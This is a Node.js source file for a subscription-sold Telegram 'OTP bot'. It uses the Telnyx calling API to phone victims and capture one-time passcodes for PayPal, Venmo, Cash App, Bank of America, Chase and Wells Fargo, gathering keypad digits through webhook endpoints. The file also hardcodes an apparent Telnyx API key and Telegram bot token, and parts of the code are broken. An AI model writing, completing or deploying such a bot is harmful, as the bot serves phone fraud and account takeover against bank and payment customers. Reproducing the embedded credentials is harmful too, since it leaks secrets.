// TELNYX STUFF 
const MY_API_KEY = 'KEY018BF55B4D0ED25E9A0861698D906F2F_xecXP42CjUQBicb53Xqadx'
const service_number = '14342338629'
const WEBHOOK_URL = 'https://ofbtc.onrender.com';
const bot_token = '6328468760:AAFlRNuKnTwAMynlXcsAH118kYhBhahUNQU'
const digits = req.body.Digits;
const ENV_TELNYX_CONNECTION_ID = '2305462997117568053'
const telnyx = require('telnyx')('MY_API_KEY');
const { Telegraf } = require('telegraf'); // importing telegraf.js
var bot = new Telegraf(bot_token)


const express = require('express');
const app = express();
const port = process.env.PORT || 3000;

async function call (customer_number, ctx){
   console.log(ctx)
   bot.telegram.sendMessage(ctx.chat.id, `call ongoing...\n Calling ${customer_number} \n please wait...`, {})

   // Use the Telnyx API to create a new call
   const { data: call } = await telnyx.calls.create({
      connection_id: ENV_TELNYX_CONNECTION_ID,
      to: customer_number,
      from: service_number,
      webhook_url: WEBHOOK_URL
   });

   call.answered({

   })


}


//  COMMANDS
bot.on('start', ctx => {
   console.log(ctx.from)
   bot.telegram.sendMessage(
      ctx.chat.id, `
      𝕆𝔽𝔹𝕋ℂ 𝕆𝕋ℙ 𝔹𝕆𝕋! \n 
      ➤ Type: /purchase to subscribe \n 
      👤 USER COMMANDS 👤 \n
      ➤ /redeem - Redeem your key\n
      ➤ /checktime - Check subscription time left\n\n
      📞 CALL COMMANDS 📞 \n 
      ➤ /call - Capture OTP (Paypal, Venmo, cashapp...)\n
      ➤ /bank - Capture bank OTP\n
      ➤ /boa - Capture boa OTP\n
      ➤ /chase - Capture chase OTP\n
      ➤ /wellsfargo - Capture Wells fargo OTP\n
      ➤ /venmo - Capture venmo OTP\n
      ➤ /paypal - Capture bank OTP\n      
      `, {})
})

bot.help(ctx => ctx.reply(`
   𝕆𝔽𝔹𝕋ℂ 𝕆𝕋ℙ 𝔹𝕆𝕋! \n 
➤ Type: /purchase to subscribe \n 
👤 USER COMMANDS 👤 \n
➤ /redeem - Redeem your key\n
➤ /checktime - Check subscription time left\n\n
📞 CALL COMMANDS 📞 \n 
➤ /call - Capture OTP (Paypal, Venmo, cashapp...)\n
➤ /bank - Capture bank OTP\n
➤ /boa - Capture boa OTP\n
➤ /chase - Capture chase OTP\n
➤ /wellsfargo - Capture Wells fargo OTP\n
➤ /venmo - Capture venmo OTP\n
➤ /paypal - Capture bank OTP\n
`))

bot.launch();


// webhook urls
app.get('/', (req, res) => {
   console.log('yay?')
   res.json({status: 'ok', code: 200})
});

app.post('/', (req, res) => {
   const digits = req.body;
   console.log(digits)
   res.json({status: 'ok', code: 200})
});

// app.post('/call', (req, res) => {
//    const digits = req.body.Digits;
//    res.json(req.body)
// });

app.post('/gather', (req, res) => {
   const digits = req.body.Digits;
   res.json(req.body)
});
 
 app.listen(port, () => {
   console.log(`Server running on port ${port}`);
 });
 

